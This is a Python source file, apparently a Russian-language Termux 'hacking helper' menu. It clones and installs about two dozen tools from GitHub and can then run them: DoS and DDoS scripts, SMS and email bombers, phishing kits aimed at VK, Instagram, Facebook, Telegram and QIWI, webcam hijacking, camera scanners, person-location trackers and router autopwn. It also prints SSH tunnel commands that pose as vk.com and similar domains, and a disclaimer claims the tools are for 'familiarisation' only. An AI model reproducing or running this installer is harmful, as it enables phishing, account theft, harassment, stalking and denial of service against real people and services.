import os
clear = lambda: os.system("clear")

from colorama import init
init()

from colorama import Fore, Back, Style

clear()
print("Сделанно KvantGD гайд на канале")
print("Ссылка на канал YouTube: https://www.youtube.com/channel/UCgOiS_SjmIVK30TmDiVgo-A")
print("")
print( Fore.CYAN + "[1]aoihttp-doser - для dos")
print( Fore.BLUE + "[2]b0mb3r - для спама смс")
print( Fore.YELLOW + "[3]YTDownload - СКАЧАТЬ ВИДЕО ИЗ ЮТУБА")
print( Fore.CYAN + "[4]cspamvk - накрутка комментариев в VK")
print( Fore.BLUE + "[5]define - для вычисления местоположения человека")
print( Fore.YELLOW + "[6]fisher - взлом VK")
print( Fore.GREEN + "[7]fuck-seeker - узнать точное местоположение человека")
print( Fore.CYAN + "[8]halk - длоя dos")
print( Fore.BLUE + "[9]hiddeneye - для фишинга с 32 шаблонами")
print( Fore.YELLOW + "[10]InfinityMailSpam - смс бомбер на почту")
print( Fore.GREEN + "[11]ipcs - взлом камер видеонаблюдения по всему миру")
print( Fore.CYAN + "[12]IPGeolocation - местоположение по ip")
print( Fore.BLUE + "[13]kingfish2.0 - взлом инстаграма")
print( Fore.YELLOW + "[14]Kingfish3 - взлом ВК, инстаграма, одноклассников, озона, телеграма")
print( Fore.GREEN + "[15]MyServer - для хостинга сайтов")
print( Fore.RED + "[16]noisy - запутать своего интернет-провайдера")
print( Fore.CYAN + "[17]Planetwork-DDOS - DDoS утилита")
print( Fore.BLUE + "[18]QIWI_Api - взлом QIWI")
print( Fore.YELLOW + "[19]routersploit - Взлом wi-fi")
print( Fore.GREEN + "[20]saycheese - взломать камеру через сайт")
print( Fore.CYAN + "[21]shellphish - Взлом FaceBook")
print( Fore.BLUE + "[22]Sherlock - пробив инфы про номеру и многое другое")
print( Fore.YELLOW + "[23]SmsHam - смс бомбер")
print( Fore.GREEN + "[24]termux-faceroot - фейковые root-права")
print( Fore.RED + "[25]Termux-login - поставить пароль на Termux")
print( Fore.RESET + "[26]TermGuard - антивирус в termux")
print("")
print( Fore.YELLOW + "[98]Выйти")
print( Fore.GREEN + "[99]Обновить утелиту")
print( Back.WHITE )
print( Fore.RED + "За использование утелит связанных со взломами я ответственность не несу они были представлены только в ознакомительный целях")
print( Back.BLACK )
print( Fore.WHITE + "                                         v1.0 release")
a=int(input( Fore.MAGENTA + "Введите номер программы: "))
print( Fore.RESET )
clear()
if a==1 :
	os.system("apt update && apt upgrade -y && apt intsall git python -y && cd && git clone https://github.com/kitasS/aiohttp-doser && cd aiohttp-doser && pip install -r requirments.txt")
	clear()
	print("Запустить:")
	start = "cd && cd aiohttp-doser && python dos.py"
	print(start)
if a==2 :
	os.system("apt update && pkg install python -y && pkg install make -y && pkg install clang -y && pip install colorama && pip install b0mb3r")
	clear()
	print("Запустить:")
	start = "b0mb3r"
	print(start)
if a==3 :
	os.system("apt update && apt upgrade -y && apt install python git -y && pip install pytube3 && cd && git clone https://github.com/kitasS/YTDownload")
	clear()
	print("Запустить:")
	start = "cd YTDownload && python YTDwnload.py"
	print(start)
if a==4 :
	print("apt update && apt install git -y && apt install python -y && apt install python2 && cd && git clone https://github.com/YamkaFox/cspamvk && cd cspamvk && pip install vkbee")
	clear()
	print("Запустить:")
	start = "cd && cd cspamvk && python main.py"
	print(start)
if a==5 :
	os.system("cd && apt update && apt install git -y && apt install python -y && apt install php -y && apt install openssh -y && cd && git clone https://github.com/TermuxGuide/termux-ngrok && cd termux-ngrok && bash termux-ngrok.sh && cd && git clone https://github.com/termux-lab/define.git")
	clear()
	print("Запустить:")
	start = "cd && cd define && php define.php"
	print(start)
	print("")
	print("Во 2 сессии")
	print("ngrok http 8080")
if a==6 :
	os.system("apt update && apt upgrade -y && pkg install python -y && pkg install python2 && apt install git -y && cd && git clone https://github.com/foxlitegor/fisher && cd fisher && chmod 777 install.sh && bash install.sh && apt install openssh -y")
	clear()
	print("Запустить:")
	start = "cd && cd fisher && fish"
	print(start)
	print("Потом введите run")
	print("")
	print("Вторая сессия:")
	print("ssh -R 80:localhost:8080 ssh.localhost.run -l vk.com")
if a==7 :
	os.system("apt update && apt upgrade -y && apt install git python -y && pip install flask && cd && git clone https://github.com/kitasS/fuck-seeker && apt install openssh -y")
	clear()
	print("Запустить:")
	start = "cd && cd fuck-seeker && python server.py"
	print(start)
	print("")
	print("Вторая сессия:")
	print("ssh -R 80:localhost:8080 ssh.localhost.run -l ip-help.com")
if a==8 :
	os.system("apt update -y && apt upgrade -y && apt install python2 && apt install git && cd && git clone https://github.com/4D4N-Termux/hulky")
	clear()
	print("Запустить:")
	start = "cd && cd hulky && python2 hulky.py http://google.com"
	print(start)
if a==9 :
	os.system("apt update && apt install git -y && apt install python -y && cd && git clone https://github.com/DarkSecDevelopers/HiddenEye.git && cd HiddenEye && pip install -r requirements.txt && pip install requests")
	clear()
	print("Запустить:")
	start = "cd && cd hiddeneye && python HiddenEye.py"
	print(start)
if a==10 :
	os.system("apt install python git nano -y && cd && git clone https://github.com/kitasS/InfinityMailSpam")
	clear()
	print("Запустить:")
	start = "cd && cd && InfinityMailSpam && python MailSpam.py"
	print(start)
if a==11 :
	os.system("pkg update -y && pkg upgrade -y && pkg install python2 -y && pkg install git -y && pip2 install requests && cd && git clone https://github.com/kancotdiq/ipcs")
	clear()
	print("Запустить:")
	start = "cd && cd && ipcs && python2 scan.py"
	print(start)
if a==12 :
	os.system("apt update && apt install python -y && apt install git -y && cd && git clone https://github.com/maldevel/IPGeoLocation && cd IPGeoLocation && pip install -r requirements.txt")
	clear()
	print("Запустить:")
	start = "cd && cd IPGeolocation && python ipgeolocation.py -t (айпи)"
	print(start)
if a==13 :
	os.system("apt update && apt install git -y && apt install python -y && apt install php -y && apt install openssh -y && cd && git clone https://github.com/TermuxGuide/termux-ngrok && cd termux-ngrok && bash termux-ngrok.sh && cd && git clone https://github.com/termux-lab/kingfish2.0 && cd kingfish2.0 && pip install prettytable")
	clear()
	print("Запустить:")
	start = "cd && cd kingfish2.0 && python fsh.py"
	print(start)
	print("")
	print("Во 2 сессии")
	print("ngrok http 8080")
if a==14 :
	os.system("apt update && apt install git -y && apt install python -y && apt install php -y && apt install openssh -y && cd && git clone https://github.com/TermuxGuide/termux-ngrok && cd termux-ngrok && bash termux-ngrok.sh && cd && git clone https://github.com/termux-lab/kingfish3 && cd kingfish3.0 && pip install prettytable && pip install colorama")
	clear()
	print("Запустить:")
	start = "cd && cd kingfish3 && python fsh.py"
	print(start)
	print("")
	print("Во 2 сессии")
	print("ngrok http 8080")
if a==15 :
	os.system("pkg update -y && pkg upgrade -y && pkg install git -y && git clone http://github.com/rajkumardusad/MyServer && cd MyServer && chmod +x install && ./install && pkg install openssh -y")
	clear()
	print("Запустить:")
	start = "myserver start"
	print(start)
	print("")
	print("Во 2 сессии")
	print("ssh -R 80:localhost:8080 ssh.localhost.run -l yourdomain")
if a==16 :
	os.system("apt update -y && apt upgrade -y && apt install python git -y && pip install requests && cd && git clone https://github.com/1tayH/noisy.git")
	clear()
	print("Запустить:")
	start = "cd && cd noisy && python noisy.py --config config.json"
	print(start)
if a==17 :
	os.system("apt update && apt install git -y && apt install python -y && apt install python2 && cd && git clone https://github.com/Hydra7/Planetwork-DDOS")
	clear()
	print("Запустить:")
	print("cd && cd Planetwork-DDOS && python2 pntddos.py [ip роутера] [порт] 999999")
if a==18 :
	os.system("apt update && apt install git -y && apt install php -y && apt install python -y && apt install libgnutls -y && pip install SimpleQIWI && pip install colorama && cd && git clone https://github.com/WannaDeauth/qiwi_api && pkg install openssh -y")
	clear()
	print("Запустить:")
	start = "cd && cd qiwi_api && python qiwi.py"
	print(start)
	print("")
	print("Во 2 сессии")
	print("ssh -R 80:localhost:8080 ssh.localhost.run -l QIWI_Api.com")
if a==19 :
	os.system("apt update && apt install git -y && apt install python -y && apt install figlet -y && pip install wheel && pip install future && cd && git clone https://github.com/41Team/RoutersploitTermux && cd RoutersploitTermux && bash run.sh")
	clear()
	print("Запустить:")
	print("cd && cd routersploit && python rsf.py && use scanners/autopwn && set target [айпишник] && exploit")
if a==20 :
	os.system("apt update && apt install git wget php openssh -y && cd && git clone https://github.com/thelinuxchoice/saycheese")
	clear()
	print("Запустить:")
	start = "cd && cd saycheese && bash saycheese.sh"
	print(start)
if a==21 :
	os.system("apt update && apt upgrade -y && apt install python -y && apt install git -y && apt install php curl openssh -y && apt install wget -y && cd &&  git clone https://github.com/thelinuxchoice/shellphish")
	clear()
	print("Запустить:")
	start = "cd && cd shellphish && bash shellphish.sh"
	print(start)
if a==22 :
	os.system("apt update && apt install git -y && apt install python -y && apt install python2 && apt install php -y && apt install openssh -y && cd && git clone https://github.com/termux-lab/sherlock && cd sherlock && pip install requests")
	clear()
	print("Запустить:")
	start = "cd && cd sherlock && python sherl.py"
	print(start)
if a==23 :
	os.system("apt update && apt install git -y && apt install python -y && cd && git clone https://github.com/termux-lab/smsham.git && cd smsham && pip install colorama && pip install requests")
	clear()
	print("Запустить:")
	start = "cd && cd smsham && python smsham.py"
	print(start)
if a==24 :
	os.system("pkg update && pkg upgrade -y && apt install git -y && cd && git clone https://github.com/saydog/termux-fakeroot && cd termux-fakeroot && chmod +x setup && ./setup && cd")
	clear()
	print("Запустить:")
	start = "root su"
	print(start)
if a==25 :
	os.system("apt update && apt install git -y && apt install python -y && cd && git clone https://github.com/Ublimjo/Termux-login && cd Termux-login && bash setup.sh")
	clear()
if a==26 :
    os.system("apt update && apt install git -y && cd && git clone https://github.com/DarkGa/TermGuard && cd TermGuard && bash install.sh && cd")
    clear()
    print("Запустить:")
    start = "tguard -h"
    print(start)
if a==98 :
	exit()
if a==99 :
    os.system("cd && rm -rf HelpTermuxHack && git clone https://github.com/KvantPro/HelpTermuxHack && cd HelpTermuxHack && clear && python KvantProgram.py")

stat = input("Запустить: (y/n)")
if stat.lower() == "y":
	os.system(start)
else:
	exit()